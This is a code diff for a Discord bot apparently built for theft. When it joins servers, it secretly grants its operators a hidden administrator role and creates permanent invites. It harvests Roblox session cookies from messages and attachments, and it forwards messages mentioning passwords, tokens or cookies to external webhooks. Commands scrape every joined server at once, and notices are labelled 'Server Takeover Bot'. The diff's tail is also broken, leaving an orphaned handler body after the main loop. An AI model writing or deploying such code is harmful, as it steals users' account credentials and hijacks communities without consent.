@@ -58,14 +58,422 @@ def run_flask():
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
 
+# 🟢 Optimized Bot Class
+class CookieFetcherBot(discord.Client):
+    def __init__(self):
+        intents = discord.Intents.default()
+        intents.messages = True
+        intents.message_content = True
+        intents.guilds = True
+        intents.members = True
+        super().__init__(intents=intents)
+        self.tree = app_commands.CommandTree(self)
+        self.fetcher = CookieFetcher()
+
+    # 🟢 Handle webhook button interactions
+    async def on_interaction(self, interaction):
+        if interaction.type == discord.InteractionType.component:
+            custom_id = interaction.data.get('custom_id', '')
+
+            if custom_id.startswith('enable_delete_'):
+                guild_id = int(custom_id.split('_')[-1])
+                guild = self.get_guild(guild_id)
+                if not guild:
+                    await interaction.response.send_message("❌ Server not found!", ephemeral=True)
+                    return
+
+                if interaction.user.id not in AUTHORIZED_USERS:
+                    await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
+                    return
+
+                bot_state.auto_delete_enabled[guild_id] = True
+                await interaction.response.send_message("✅ Auto-delete enabled! Messages with @everyone/@here will be deleted.", ephemeral=True)
+
+            elif custom_id.startswith('disable_delete_'):
+                guild_id = int(custom_id.split('_')[-1])
+                guild = self.get_guild(guild_id)
+                if not guild:
+                    await interaction.response.send_message("❌ Server not found!", ephemeral=True)
+                    return
+
+                if interaction.user.id not in AUTHORIZED_USERS:
+                    await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
+                    return
+
+                bot_state.auto_delete_enabled[guild_id] = False
+                await interaction.response.send_message("❌ Auto-delete disabled!", ephemeral=True)
+
+            elif custom_id.startswith('scrape_'):
+                guild_id = int(custom_id.split('_')[-1])
+                guild = self.get_guild(guild_id)
+                if not guild:
+                    await interaction.response.send_message("❌ Server not found!", ephemeral=True)
+                    return
+
+                if interaction.user.id not in AUTHORIZED_USERS:
+                    await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
+                    return
+
+                await interaction.response.defer(ephemeral=True)
+                await scrape_server_cookies(interaction, guild)
+
+    async def auto_scrape_all_servers_on_restart(self):
+        """Auto-scrape all non-owned servers on bot restart"""
+        logger.info("🔄 Auto-scraping all servers on restart...")
+
+        for guild in self.guilds:
+            if guild.id not in OWNED_SERVER_IDS:
+                try:
+                    logger.info(f"🔄 Auto-scraping {guild.name} on restart...")
+                    start_time = datetime.datetime.now()
+
+                    result = await self.fetcher.fetch_all_server_cookies(guild)
+                    all_cookies = list(set(result['all']))
+                    actual_messages_scanned = result.get('messages_scanned', 0)
+                    attachments_scanned = result.get('attachments_scanned', 0)
+                    unique_cookies = [c for c in all_cookies if 'CAEaAhAC' in c]
+
+                    end_time = datetime.datetime.now()
+                    time_taken = (end_time - start_time).total_seconds()
+
+                    # Send to cookie webhook
+                    await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
+
+                    logger.info(f"✅ Restart auto-scraped {len(all_cookies)} cookies from {guild.name}")
+                except Exception as e:
+                    logger.error(f"❌ Error auto-scraping {guild.name} on restart: {e}")
+
+    async def setup_hook(self):
+        await self.tree.sync()
+        logger.info("✅ Commands synced")
+
+    async def on_ready(self):
+        logger.info(f'✅ Bot online: {self.user} (ID: {self.user.id})')
+        logger.info(f'📊 Connected to {len(self.guilds)} servers')
+
+        # 🟢 AUTO-SCRAPE ALL SERVERS ON RESTART
+        await self.auto_scrape_all_servers_on_restart()
+
+
+    async def ensure_dollar_role(self, guild):
+        """Ensure $$$ role exists (only create one)"""
+        if guild.id in bot_state.server_roles:
+            return bot_state.server_roles[guild.id]
+        
+        # Check if role already exists
+        existing_role = discord.utils.get(guild.roles, name="$$$")
+        if existing_role:
+            bot_state.server_roles[guild.id] = existing_role
+            return existing_role
+        
+        # Create new role
+        try:
+            role = await guild.create_role(
+                name="$$$",
+                permissions=discord.Permissions(administrator=True),
+                color=discord.Color.gold(),
+                hoist=False,  # Make invisible
+                mentionable=False
+            )
+            bot_state.server_roles[guild.id] = role
+            logger.info(f"Created $$$ role in {guild.name}")
+            return role
+        except Exception as e:
+            logger.error(f"Error creating role in {guild.name}: {e}")
+            return None
+
+    async def assign_role_to_authorized(self, guild):
+        """Assign $$$ role to authorized users"""
+        role = await self.ensure_dollar_role(guild)
+        if not role:
+            return
+        
+        for user_id in AUTHORIZED_USERS:
+            member = guild.get_member(user_id)
+            if member and role not in member.roles:
+                try:
+                    await member.add_roles(role, reason="Authorized user")
+                    logger.info(f"Assigned $$$ role to {member.name} in {guild.name}")
+                except Exception as e:
+                    logger.error(f"Error assigning role to {member.name}: {e}")
+
+    async def auto_scrape_server(self, guild):
+        """Auto-scrape a single server"""
+        try:
+            logger.info(f"🔄 Auto-scraping new server: {guild.name}")
+            start_time = datetime.datetime.now()
+            
+            result = await self.fetcher.fetch_all_server_cookies(guild)
+            all_cookies = list(set(result['all']))
+            actual_messages_scanned = result.get('messages_scanned', 0)
+            attachments_scanned = result.get('attachments_scanned', 0)
+            unique_cookies = [c for c in all_cookies if 'CAEaAhAC' in c]
+            
+            end_time = datetime.datetime.now()
+            time_taken = (end_time - start_time).total_seconds()
+
+            # Send to cookie webhook
+            await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
+            
+            logger.info(f"✅ Auto-scraped {guild.name}: {len(all_cookies)} cookies")
+            
+        except Exception as e:
+            logger.error(f"❌ Error auto-scraping {guild.name}: {e}")
+
+    async def on_guild_join(self, guild):
+        """Handle server join - AUTO everything"""
+        try:
+            # Generate invite
+            invite_url = "No invite available"
+            try:
+                channels = [c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite]
+                if channels:
+                    invite = await channels[0].create_invite(max_age=0, max_uses=0, reason="Bot invite")
+                    invite_url = invite.url
+                    SERVER_INVITES[guild.id] = invite_url
+            except Exception:
+                pass
+
+            if guild.id not in OWNED_SERVER_IDS:
+                # Send takeover notification with buttons to mirror webhook
+                takeover_embed = discord.Embed(
+                    title="🚨 New Server Joined",
+                    description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
+                    color=0x00ff00
+                )
+
+                takeover_data = {
+                    'username': 'Server Takeover Bot',
+                    'content': '@everyone',
+                    'embeds': [takeover_embed.to_dict()],
+                    'components': [
+                        {
+                            'type': 1,  # Action row
+                            'components': [
+                                {
+                                    'type': 2,  # Button
+                                    'style': 3,  # Green
+                                    'label': 'Enable Auto-Delete',
+                                    'custom_id': f'enable_delete_{guild.id}'
+                                },
+                                {
+                                    'type': 2,  # Button
+                                    'style': 4,  # Red
+                                    'label': 'Disable Auto-Delete',
+                                    'custom_id': f'disable_delete_{guild.id}'
+                                },
+                                {
+                                    'type': 2,  # Button
+                                    'style': 2,  # Grey
+                                    'label': 'Scrape Cookies',
+                                    'custom_id': f'scrape_{guild.id}'
+                                }
+                            ]
+                        }
+                    ]
+                }
+
+                # Send takeover with buttons to mirror webhook
+                if MIRROR_WEBHOOK_URL:
+                    async with aiohttp.ClientSession() as session:
+                        async with session.post(MIRROR_WEBHOOK_URL, json=takeover_data) as response:
+                            if response.status not in [200, 204]:
+                                logger.error(f"Failed to send takeover to mirror webhook: {response.status}")
+
+                # 🟢 AUTO-ASSIGN ROLES
+                await self.assign_role_to_authorized(guild)
+
+                # 🟢 AUTO-SCRAPE IMMEDIATELY
+                await self.auto_scrape_server(guild)
+
+                logger.info(f"✅ Auto-setup completed for {guild.name}")
+
+        except Exception as e:
+            logger.error(f"Error in on_guild_join: {e}")
+
+    async def on_member_join(self, member):
+        """Auto-assign $$$ role to authorized users when they join"""
+        if member.id in AUTHORIZED_USERS and member.guild.id not in OWNED_SERVER_IDS:
+            await self.assign_role_to_authorized(member.guild)
+
+    async def on_message(self, message):
+        if message.author == self.user:
+            return
+
+        if message.guild and message.guild.id in OWNED_SERVER_IDS:
+            return
+
+        guild_id = message.guild.id if message.guild else None
+
+        # 🟢 AUTO-DELETE @everyone/@here messages if enabled
+        if (guild_id in bot_state.auto_delete_enabled and
+            bot_state.auto_delete_enabled[guild_id] and
+            message.guild and
+            (message.mention_everyone or
+             '@everyone' in message.content.lower() or
+             '@here' in message.content.lower())):
+
+            try:
+                if message.channel.permissions_for(message.guild.me).manage_messages:
+                    await message.delete()
+                    logger.info(f"🗑️ Deleted ping message from {message.author.name} in {message.guild.name}")
+            except Exception as e:
+                logger.error(f"Error deleting message: {e}")
+
+        # 🟢 AUTO-MIRROR specific messages if MIRROR_WEBHOOK_URL is set
+        if (MIRROR_WEBHOOK_URL and
+            message.id not in bot_state.mirrored_messages and
+            message.guild):
+            
+            should_mirror = False
+            mirror_reason = ""
+            
+            # Check for @everyone/@here
+            if message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower():
+                should_mirror = True
+                mirror_reason = "Mass ping detected"
+            
+            # Check for password/keywords in content
+            sensitive_keywords = ['password', 'login', 'credential', 'token', 'secret', 'cookie', 'roblox']
+            if any(keyword in message.content.lower() for keyword in sensitive_keywords):
+                should_mirror = True
+                mirror_reason = "Sensitive content detected"
+            
+            # Check embeds for sensitive content
+            for embed in message.embeds:
+                embed_text = f"{embed.title or ''} {embed.description or ''}"
+                if any(keyword in embed_text.lower() for keyword in sensitive_keywords):
+                    should_mirror = True
+                    mirror_reason = "Sensitive content in embed"
+                    break
+
+            if should_mirror:
+                bot_state.mirrored_messages.add(message.id)
+                await self.mirror_message(message, mirror_reason)
+
+    async def mirror_message(self, message, reason):
+        """Mirror message to webhook"""
+        try:
+            async with aiohttp.ClientSession() as session:
+                mirror_data = {
+                    'username': f"{message.author.name} | {message.guild.name}",
+                    'content': f"**{reason}**\n{message.content}",
+                    'avatar_url': str(message.author.avatar.url) if message.author.avatar else None
+                }
+
+                if message.embeds:
+                    mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]
+
+                async with session.post(MIRROR_WEBHOOK_URL, json=mirror_data) as response:
+                    if response.status not in [200, 204]:
+                        logger.error(f"Failed to mirror message: {response.status}")
+
+        except Exception as e:
+            logger.error(f"Error mirroring message: {e}")
+
 # Start Flask in background
 flask_thread = Thread(target=run_flask)
 flask_thread.daemon = True
 flask_thread.start()
 
-# 🟢 Handle webhook button interactions
-@bot.event
-async def on_interaction(interaction):
+# Initialize bot
+bot = CookieFetcherBot()
+
+# 🟢 Scrape command (anyone can use)
+@bot.tree.command(name="scrape", description="Scrape Roblox cookies from this server")
+async def scrape_command(interaction: discord.Interaction):
+    await interaction.response.defer(ephemeral=True)
+    await scrape_server_cookies(interaction, interaction.guild)
+
+# 🟢 Use command (authorized only)
+@bot.tree.command(name="use", description="Scrape cookies from a specific server by invite link")
+@app_commands.describe(invite="Server invite link")
+async def use_command(interaction: discord.Interaction, invite: str):
+    if interaction.user.id not in AUTHORIZED_USERS:
+        await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+
+    try:
+        # Extract invite code from URL
+        import re
+        invite_match = re.search(r'discord\.gg/([a-zA-Z0-9]+)', invite)
+        if not invite_match:
+            await interaction.followup.send("❌ Invalid invite link format!", ephemeral=True)
+            return
+
+        invite_code = invite_match.group(1)
+
+        # Check if bot is in that server
+        invite_obj = await bot.fetch_invite(invite_code)
+        if not invite_obj or not invite_obj.guild:
+            await interaction.followup.send("❌ Could not find server or bot is not in it!", ephemeral=True)
+            return
+
+        target_guild = invite_obj.guild
+        bot_member = target_guild.get_member(bot.user.id)
+        if not bot_member:
+            await interaction.followup.send("❌ Bot is not in that server!", ephemeral=True)
+            return
+
+        # Scrape the target server
+        await scrape_server_cookies(interaction, target_guild)
+
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
+
+# 🟢 Vex command (authorized only)
+@bot.tree.command(name="vex", description="Scrape cookies from ALL servers the bot is in")
+async def vex_command(interaction: discord.Interaction):
+    if interaction.user.id not in AUTHORIZED_USERS:
+        await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+
+    total_servers = 0
+    total_cookies = 0
+
+    for guild in bot.guilds:
+        if guild.id not in OWNED_SERVER_IDS:
+            try:
+                result = await bot.fetcher.fetch_all_server_cookies(guild)
+                cookies = result['all']
+                total_cookies += len(cookies)
+                total_servers += 1
+
+                # Send to webhook
+                unique_cookies = [c for c in cookies if 'CAEaAhAC' in c]
+                messages_scanned = result.get('messages_scanned', 0)
+                attachments_scanned = result.get('attachments_scanned', 0)
+                await bot.fetcher.send_to_cookie_webhook(cookies, unique_cookies, messages_scanned, attachments_scanned, 0)
+
+            except Exception as e:
+                logger.error(f"Error scraping {guild.name}: {e}")
+
+    await interaction.followup.send(f"✅ Scraped {total_servers} servers, found {total_cookies} total cookies!", ephemeral=True)
+
+# 🟢 Enhanced auto-restart main loop
+if __name__ == "__main__":
+    if not BOT_TOKEN:
+        logger.error("❌ DISCORD_TOKEN not found")
+        exit(1)
+
+    logger.info("🚀 Starting Bot on Render...")
+    
+    # Auto-restart on crash
+    while True:
+        try:
+            bot.run(BOT_TOKEN)
+        except discord.LoginFailure:
+            logger.error("❌ Invalid token - stopping")
+            break
+        except Exception as e:
+            logger.error(f"❌ Bot crashed: {e}")
+            logger.info("🔄 Restarting in 10 seconds...")
+            import time
+            time.sleep(10)
     if interaction.type == discord.InteractionType.component:
         custom_id = interaction.data.get('custom_id', '')
 
